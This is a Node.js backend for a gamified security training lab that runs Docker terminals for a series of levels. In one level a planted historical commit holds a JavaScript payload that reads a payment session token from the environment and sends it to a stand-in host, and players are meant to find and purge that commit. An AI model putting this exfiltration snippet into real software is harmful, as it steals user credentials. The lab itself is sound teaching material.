const express = require('express');
const cors = require('cors');
const fs = require('fs');
const path = require('path');
const http = require('http');
const { Server } = require('socket.io');
const pty = require('node-pty');

const app = express();
const server = http.createServer(app);
const io = new Server(server, {
  cors: {
    origin: "*",
    methods: ["GET", "POST"]
  }
});

const PORT = process.env.PORT || 3000;

app.use(cors());
app.use(express.json());

// Serve static frontend files with html extension fallback
app.use(express.static(path.join(__dirname, '../frontend'), {
  extensions: ['html']
}));

const dataPath = path.join(__dirname, 'players.json');

// Initialize database file if it doesn't exist
if (!fs.existsSync(dataPath)) {
  fs.writeFileSync(dataPath, JSON.stringify({ players: [] }, null, 2));
}

const readData = () => JSON.parse(fs.readFileSync(dataPath, 'utf8'));
const writeData = (data) => fs.writeFileSync(dataPath, JSON.stringify(data, null, 2));

// --- Endpoints ---
app.get('/api/health', (req, res) => res.json({ status: 'ok' }));

app.post('/api/players/register', (req, res) => {
  const { username, age, gender } = req.body;
  if (!username) return res.status(400).json({ error: 'Username is required' });

  const data = readData();
  let player = data.players.find(p => p.username === username);

  if (!player) {
    player = { id: Date.now().toString(), username, age: age || null, gender: gender || null, history: [], joinedAt: new Date().toISOString() };
    data.players.push(player);
    writeData(data);
  }
  res.json({ message: 'Player ready', player });
});

app.post('/api/players/:username/progress', (req, res) => {
  const { username } = req.params;
  const { levelId, status, logs, score } = req.body;
  const data = readData();
  const playerIndex = data.players.findIndex(p => p.username === username);
  
  if (playerIndex === -1) return res.status(404).json({ error: 'Player not found' });
  
  data.players[playerIndex].history.push({ levelId, status, logs: logs || [], score: score || 0, completedAt: new Date().toISOString() });
  writeData(data);
  res.json({ message: 'Progress saved', history: data.players[playerIndex].history });
});

// --- WebSockets for Docker Terminal ---
io.on('connection', (socket) => {
  console.log(`[Socket] Player connected: ${socket.id}`);
  
  let ptyProcess = null;
  let activeLevelId = null;
  const level3State = {
    currentCommit: 'main',
    historyClean: false,
    scanCount: 0,
  };

  const emitLevel3Scan = () => {
    level3State.scanCount += 1;

    const lines = [
      '',
      'DCIB Repository Scan',
      'Target: payment-gateway',
      '',
    ];

    if (level3State.historyClean) {
      lines.push('No threats detected.', 'Historical payload index: clean');
    } else if (level3State.currentCommit === 'a17c9e4') {
      lines.push(
        'Threat detected',
        'File: payloads/session_hook.js',
        'Signature: credential siphon / token exfiltration',
        '__L3_THREAT_DETECTED__',
      );
    } else {
      lines.push('No threats detected', 'Current working tree appears clean.');

      if (level3State.scanCount === 1) {
        lines.push('__L3_SCAN_CLEAN__');
      }
    }

    socket.emit('terminal_output', `${lines.join('\r\n')}\r\n`);
  };

  socket.on('start_lab', (data) => {
    console.log(`[Socket] Starting lab for ${socket.id} - Level: ${data.levelId}`);
    activeLevelId = data.levelId;
    
    let dockerCmd = ['run', '-it', '--rm'];
    
    if (data.levelId === 'recruitment') {
      const setupScript = `
        mkdir -p /home/recruit/documents
        mkdir -p /home/recruit/.cache/tmp
        mkdir -p /home/recruit/.config/dcib_vault
        
        # Decoys
        echo 'DCIB Policy 42: Do not share credentials.' > /home/recruit/documents/policy.txt
        echo 'Check the HR portal for onboarding guides.' > /home/recruit/documents/onboarding.md
        echo 'System logs cleared.' > /home/recruit/.cache/tmp/syslog_backup
        echo 'binary_garbage_0x9A4F' > /home/recruit/.cache/session.dat
        echo 'ID 1138 access denied.' > /home/recruit/.config/dcib_vault/access.log
        
        # Actual Clues
        echo 'Welcome, Candidate 8472.' > /home/recruit/welcome_note.txt
        echo 'Your objective is to find the Agent Password hidden in this system.' >> /home/recruit/welcome_note.txt
        echo 'Hint: A good agent always checks hidden configurations.' >> /home/recruit/welcome_note.txt
        
        echo 'The password file is locked by the system administrator.' > /home/recruit/.config/dcib_vault/hint.txt
        echo 'You must modify its permissions to read it.' >> /home/recruit/.config/dcib_vault/hint.txt
        echo 'Note: The payload is encoded in standard Base64.' >> /home/recruit/.config/dcib_vault/hint.txt
        
        echo 'ZGVsdGFTZWN1cmU=' > /home/recruit/.config/dcib_vault/credentials.b64
        chmod 000 /home/recruit/.config/dcib_vault/credentials.b64
        
        echo '#!/bin/bash' > /usr/local/bin/login
        echo 'echo "Agent ID:"' >> /usr/local/bin/login
        echo 'read id' >> /usr/local/bin/login
        echo 'echo "Password:"' >> /usr/local/bin/login
        echo 'read pass' >> /usr/local/bin/login
        echo 'if [ "$id" == "8472" ] && [ "$pass" == "deltaSecure" ]; then' >> /usr/local/bin/login
        echo '  echo "Authentication successful."' >> /usr/local/bin/login
        echo '  echo "Welcome Agent."' >> /usr/local/bin/login
        echo '  echo "You are now authorized to access DCIB investigations."' >> /usr/local/bin/login
        echo '  echo "Type \\"view-cases\\" to see available investigations."' >> /usr/local/bin/login
        echo 'else' >> /usr/local/bin/login
        echo '  echo "Authentication failed. Invalid Agent ID or password."' >> /usr/local/bin/login
        echo 'fi' >> /usr/local/bin/login
        chmod +x /usr/local/bin/login
        
        echo '#!/bin/bash' > /usr/local/bin/view-cases
        echo 'echo "Available Investigations"' >> /usr/local/bin/view-cases
        echo 'echo ""' >> /usr/local/bin/view-cases
        echo 'echo "CASE 001 - The Missing Dependency"' >> /usr/local/bin/view-cases
        echo 'echo "Status: OPEN"' >> /usr/local/bin/view-cases
        echo 'echo ""' >> /usr/local/bin/view-cases
        echo 'echo "solve case1"' >> /usr/local/bin/view-cases
        chmod +x /usr/local/bin/view-cases
        
        echo '#!/bin/bash' > /usr/local/bin/solve
        echo 'if [ "$1" == "case1" ]; then' >> /usr/local/bin/solve
        echo '  echo "Launching investigation..."' >> /usr/local/bin/solve
        echo '  echo "__REDIRECT_TO_LEVEL_2__"' >> /usr/local/bin/solve
        echo 'else' >> /usr/local/bin/solve
        echo '  echo "Unknown case. Try: solve case1"' >> /usr/local/bin/solve
        echo 'fi' >> /usr/local/bin/solve
        chmod +x /usr/local/bin/solve
        
        cd /home/recruit
        export PS1='recruit@dcib:\\w\\$ '
        clear
        echo "--------------------------------------------------"
        echo "DEVOPS CRIME INVESTIGATION BUREAU"
        echo "Recruitment Screening Terminal v1.0"
        echo "--------------------------------------------------"
        echo ""
        echo "Welcome, Candidate."
        echo ""
        echo "DCIB systems cannot be accessed without proving technical competence."
        echo ""
        echo "OBJECTIVE:"
        echo "Locate your Agent Credentials hidden within this system."
        echo ""
        echo "After finding your credentials, authenticate using the command:"
        echo "login"
        echo ""
        echo "--------------------------------------------------"
        exec bash --noprofile --norc
      `;
      dockerCmd.push('ubuntu:22.04', 'bash', '-c', setupScript);
    } else if (data.levelId === 'level_1') {
      const setupScript = `
        echo '#!/bin/bash' > /usr/local/bin/npm
        echo 'if [ "$1" == "install" ] && [ "$2" == "lodash" ]; then' >> /usr/local/bin/npm
        echo '  echo "npm WARN deprecated lodash@4.17.21..."' >> /usr/local/bin/npm
        echo '  sleep 1' >> /usr/local/bin/npm
        echo '  echo "added 1 package, and audited 2 packages in 1s"' >> /usr/local/bin/npm
        echo '  echo "__DEPENDENCY_INSTALLED__"' >> /usr/local/bin/npm
        echo 'else' >> /usr/local/bin/npm
        echo '  echo "npm ERR! code ENOTFOUND"' >> /usr/local/bin/npm
        echo 'fi' >> /usr/local/bin/npm
        chmod +x /usr/local/bin/npm
        
        echo '#!/bin/bash' > /usr/local/bin/lsof
        echo 'if [ "$1" == "-i" ] && [ "$2" == ":8080" ]; then' >> /usr/local/bin/lsof
        echo '  echo "COMMAND   PID   USER   FD   TYPE DEVICE SIZE/OFF NODE NAME"' >> /usr/local/bin/lsof
        echo '  echo "node      4052  admin  22u  IPv4 0x3a21      0t0  TCP *:8080 (LISTEN)"' >> /usr/local/bin/lsof
        echo 'else' >> /usr/local/bin/lsof
        echo '  echo ""' >> /usr/local/bin/lsof
        echo 'fi' >> /usr/local/bin/lsof
        chmod +x /usr/local/bin/lsof
        
        echo '#!/bin/bash' > /usr/local/bin/kill
        echo 'if [ "$1" == "-9" ] && [ "$2" == "4052" ]; then' >> /usr/local/bin/kill
        echo '  echo "[1]+  Killed                  node server.js"' >> /usr/local/bin/kill
        echo '  echo "__PORT_FREED__"' >> /usr/local/bin/kill
        echo 'else' >> /usr/local/bin/kill
        echo '  /bin/kill "$@"' >> /usr/local/bin/kill
        echo 'fi' >> /usr/local/bin/kill
        chmod +x /usr/local/bin/kill
        
        echo "enable -n kill" > /root/.bashrc
        echo "export PS1='config@dcib-build:~\\$ '" >> /root/.bashrc
        
        cd /root
        exec bash --init-file /root/.bashrc
      `;
      dockerCmd.push('ubuntu:22.04', 'bash', '-c', setupScript);
    } else if (data.levelId === 'level_3') {
      const setupScript = `
        mkdir -p /workspace/payment-gateway/scripts
        mkdir -p /workspace/payment-gateway/src
        mkdir -p /opt/dcib-state

        echo main > /opt/dcib-state/current_commit
        echo 0 > /opt/dcib-state/history_clean
        echo 0 > /opt/dcib-state/reverted
        echo 0 > /opt/dcib-state/scan_count

        cat > /workspace/payment-gateway/README.md <<'EOF'
# payment-gateway

DCIB mirror of the payment gateway service.
Current branch scans clean, but deployment behavior suggests an older payload may be reachable.
EOF

        cat > /workspace/payment-gateway/src/server.js <<'EOF'
function healthcheck() {
  return "ok";
}

module.exports = { healthcheck };
EOF

        cat > /workspace/payment-gateway/scripts/deploy-preview.sh <<'EOF'
#!/bin/bash
echo "Preparing preview deploy..."
git checkout a17c9e4 -- payloads/session_hook.js
node payloads/session_hook.js --preview
EOF
        chmod +x /workspace/payment-gateway/scripts/deploy-preview.sh

        cat > /usr/local/bin/dcib-scan <<'EOF'
#!/bin/bash
current="$(cat /opt/dcib-state/current_commit)"
history_clean="$(cat /opt/dcib-state/history_clean)"
scan_count="$(cat /opt/dcib-state/scan_count)"
scan_count=$((scan_count + 1))
echo "$scan_count" > /opt/dcib-state/scan_count

echo "DCIB Repository Scan"
echo "Target: payment-gateway"
echo ""

if [ "$history_clean" = "1" ]; then
  echo "No threats detected."
  echo "Historical payload index: clean"
  exit 0
fi

if [ "$current" = "a17c9e4" ]; then
  echo "Threat detected"
  echo "File: payloads/session_hook.js"
  echo "Signature: credential siphon / token exfiltration"
  echo "__L3_THREAT_DETECTED__"
  exit 0
fi

echo "No threats detected"
echo "Current working tree appears clean."
if [ "$scan_count" = "1" ]; then
  echo "__L3_SCAN_CLEAN__"
fi
EOF
        chmod +x /usr/local/bin/dcib-scan

        cat > /usr/local/bin/git <<'EOF'
#!/bin/bash
cmd="$1"
shift || true

case "$cmd" in
  status)
    current="$(cat /opt/dcib-state/current_commit)"
    echo "On branch main"
    if [ "$current" = "a17c9e4" ]; then
      echo "HEAD detached at a17c9e4"
    fi
    echo "nothing to commit, working tree clean"
    ;;
  grep)
    pattern="$*"
    if echo "$pattern" | grep -q "git checkout"; then
      echo "scripts/deploy-preview.sh:git checkout a17c9e4 -- payloads/session_hook.js"
      echo "__L3_FOUND_FILE__"
    else
      echo ""
    fi
    ;;
  checkout)
    if [ "$1" = "a17c9e4" ]; then
      echo a17c9e4 > /opt/dcib-state/current_commit
      mkdir -p /workspace/payment-gateway/payloads
      cat > /workspace/payment-gateway/payloads/session_hook.js <<'PAYLOAD'
const token = process.env.PAYMENT_SESSION_TOKEN;
fetch("https://shadow-sync.invalid/collect", {
  method: "POST",
  body: JSON.stringify({ token })
});
PAYLOAD
      echo "Note: switching to 'a17c9e4'."
      echo "Historical file restored: payloads/session_hook.js"
      echo "__L3_CHECKED_OUT_BAD_COMMIT__"
    elif [ "$1" = "main" ]; then
      echo main > /opt/dcib-state/current_commit
      echo "Switched to branch 'main'"
    else
      echo "error: pathspec '$1' did not match any known commit"
    fi
    ;;
  log)
    cat <<'LOG'
commit f2d4c91 HEAD -> main
Author: Mira Chen <mira@dcib.local>
Date:   Tue Mar 03 09:17:42 2026 +0000

    remove obsolete preview payload

commit a17c9e4
Author: Jia Tan <jiatan@chaos.invalid>
Date:   Tue Mar 03 08:55:10 2026 +0000

    add temporary session hook for preview deploy

commit 8c4b210
Author: Priya Shah <priya@dcib.local>
Date:   Mon Mar 02 16:18:33 2026 +0000

    harden payment gateway healthcheck
LOG
    echo "__L3_ATTACKER_IDENTIFIED__"
    ;;
  show)
    if [ "$1" = "a17c9e4" ]; then
      cat <<'SHOW'
commit a17c9e4
Author: Jia Tan <jiatan@chaos.invalid>
Date:   Tue Mar 03 08:55:10 2026 +0000

    add temporary session hook for preview deploy

diff --git a/payloads/session_hook.js b/payloads/session_hook.js
+const token = process.env.PAYMENT_SESSION_TOKEN;
+fetch("https://shadow-sync.invalid/collect", {
+  method: "POST",
+  body: JSON.stringify({ token })
+});
SHOW
      echo "__L3_ATTACKER_IDENTIFIED__"
    else
      echo "fatal: ambiguous argument '$1': unknown revision"
    fi
    ;;
  revert)
    if [ "$1" = "a17c9e4" ]; then
      echo 1 > /opt/dcib-state/reverted
      echo main > /opt/dcib-state/current_commit
      rm -rf /workspace/payment-gateway/payloads
      echo "[main 74e2a1c] Revert malicious session hook"
      echo " 1 file changed, 4 deletions(-)"
      echo "Partial cleanup complete. Historical commit remains reachable."
      echo "__L3_REVERTED_PARTIAL__"
    else
      echo "error: commit '$1' is not in this training repository"
    fi
    ;;
  rebase)
    if [ "$1" = "-i" ]; then
      reverted="$(cat /opt/dcib-state/reverted)"
      if [ "$reverted" = "1" ]; then
        echo 1 > /opt/dcib-state/history_clean
        echo main > /opt/dcib-state/current_commit
        sed -i '/git checkout a17c9e4/d' /workspace/payment-gateway/scripts/deploy-preview.sh
        sed -i '/session_hook/d' /workspace/payment-gateway/scripts/deploy-preview.sh
        echo "Successfully rebased and updated refs/heads/main."
        echo "Dropped commit a17c9e4 from reachable project history."
        echo "__L3_HISTORY_CLEANED__"
      else
        echo "Interactive rebase prepared, but DCIB policy requires reverting the active payload first."
      fi
    else
      echo "This lab only supports: git rebase -i"
    fi
    ;;
  *)
    echo "git training shell supports: status, grep, checkout, log, show, revert, rebase -i"
    ;;
esac
EOF
        chmod +x /usr/local/bin/git

        echo "export PATH=/usr/local/bin:\\$PATH" > /root/.bashrc
        echo "export PS1='\\[\\033[32m\\]agent@DCIB MINGW64\\[\\033[0m\\] \\[\\033[33m\\]/workspace/payment-gateway (main)\\[\\033[0m\\]\\n\\$ '" >> /root/.bashrc
        cd /workspace/payment-gateway
        clear
        echo "--------------------------------------------------"
        echo "DCIB CASE 002: GIT TIME MACHINE ATTACK"
        echo "--------------------------------------------------"
        echo "Current repository mirror loaded."
        echo "Use the page controls or terminal commands to investigate."
        echo ""
        echo "Suggested start: click Run DCIB Scan."
        echo "--------------------------------------------------"
        echo "__L3_LAB_READY__"
        exec bash --init-file /root/.bashrc
      `;
      dockerCmd.push('ubuntu:22.04', 'bash', '-c', setupScript);
    } else {
      dockerCmd.push('ubuntu:22.04', '/bin/bash');
    }

    try {
      ptyProcess = pty.spawn('docker', dockerCmd, {
        name: 'xterm-color',
        cols: data.cols || 80,
        rows: data.rows || 24,
        cwd: process.env.HOME,
        env: process.env
      });
    } catch (err) {
      console.error(`[Socket] Failed to start lab container: ${err.message}`);
      socket.emit('terminal_output', `\r\n[System] Failed to start Docker lab: ${err.message}\r\n`);
      if (data.levelId === 'level_3') {
        socket.emit('lab_ready');
      }
      return;
    }

    if (data.levelId === 'level_3') {
      socket.emit('lab_ready');
    }

    ptyProcess.onData((data) => {
      socket.emit('terminal_output', data);
    });

    ptyProcess.onExit((code) => {
      console.log(`[Socket] Lab container exited with code ${code.exitCode}`);
      socket.emit('terminal_output', `\r\n[System] Lab session ended (Exit Code: ${code.exitCode})\r\n`);
    });
  });

  socket.on('terminal_input', (data) => {
    if (ptyProcess) {
      ptyProcess.write(data);
    }
  });

  socket.on('run_lab_command', (data) => {
    const command = data && data.command;

    if (activeLevelId !== 'level_3') {
      socket.emit('terminal_output', '\r\n[System] Git lab is not ready yet.\r\n');
      return;
    }

    if (command === 'dcib-scan') {
      if (data.currentCommit === 'a17c9e4' || data.currentCommit === 'main') {
        level3State.currentCommit = data.currentCommit;
      }

      if (typeof data.historyClean === 'boolean') {
        level3State.historyClean = data.historyClean;
      }

      emitLevel3Scan();
      return;
    }

    socket.emit('terminal_output', '\r\n[System] Unsupported lab command.\r\n');
  });
  
  socket.on('terminal_resize', (data) => {
    if (ptyProcess) {
      try {
        ptyProcess.resize(data.cols, data.rows);
      } catch (e) {
        console.error('Resize error:', e);
      }
    }
  });

  socket.on('disconnect', () => {
    console.log(`[Socket] Player disconnected: ${socket.id}`);
    if (ptyProcess) {
      ptyProcess.kill();
    }
  });
});

server.listen(PORT, () => {
  console.log(`Backend server running on http://localhost:${PORT}`);
});
